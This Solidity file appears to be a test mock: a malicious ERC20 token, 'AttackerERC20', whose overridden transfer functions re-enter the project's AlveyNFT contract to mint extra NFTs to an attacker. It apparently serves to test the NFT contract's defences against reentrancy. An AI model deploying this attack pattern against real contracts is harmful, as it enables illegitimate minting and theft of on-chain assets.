// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./AlveyNFT.sol";

/**
 * @title AttackerERC20
 * @dev 恶意ERC20代币，用于模拟重入攻击
 */
contract AttackerERC20 is ERC20, Ownable {
    using Address for address;

    AlveyNFT public targetContract;
    address public attacker;
    bool public attackMode = false;
    uint256 public attackCount = 0;
    uint256 public maxAttackCount = 3; // 最多尝试重入三次
    string public attackUri = "malicious://attack";

    event AttackAttempted(uint256 count, bool success);

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }

    // 设置攻击目标
    function setTargetContract(address _targetContract) external onlyOwner {
        targetContract = AlveyNFT(_targetContract);
    }

    // 设置攻击者
    function setAttacker(address _attacker) external onlyOwner {
        attacker = _attacker;
        _mint(attacker, 1000000 * 10**18);
    }

    // 启动攻击模式
    function enableAttackMode() external {
        require(msg.sender == attacker, "Only attacker can enable attack mode");
        attackMode = true;
        attackCount = 0;
    }

    // 关闭攻击模式
    function disableAttackMode() external {
        require(msg.sender == attacker, "Only attacker can disable attack mode");
        attackMode = false;
    }

    // 重写transfer函数尝试重入攻击
    function transfer(address to, uint256 amount) public override returns (bool) {
        // 正常转账逻辑
        bool success = super.transfer(to, amount);

        // 如果不是攻击模式，或者不是转账给目标合约，则正常执行
        if (!attackMode || to != address(targetContract) || attackCount >= maxAttackCount) {
            return success;
        }

        // 执行攻击：在接收方收到代币后尝试再次铸造NFT
        attackCount++;
        emit AttackAttempted(attackCount, _attemptReentrantMint());
        
        return success;
    }

    // 重写transferFrom函数尝试重入攻击
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        // 正常转账逻辑
        bool success = super.transferFrom(from, to, amount);

        // 如果不是攻击模式，或者不是转账给目标合约，则正常执行
        if (!attackMode || to != address(targetContract) || attackCount >= maxAttackCount) {
            return success;
        }

        // 执行攻击：在接收方收到代币后尝试再次铸造NFT
        attackCount++;
        emit AttackAttempted(attackCount, _attemptReentrantMint());
        
        return success;
    }

    // 尝试重入铸造
    function _attemptReentrantMint() internal returns (bool) {
        try targetContract.safeMint(attacker, attackUri) {
            return true;
        } catch {
            return false;
        }
    }

    // 允许owner铸造代币
    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
} 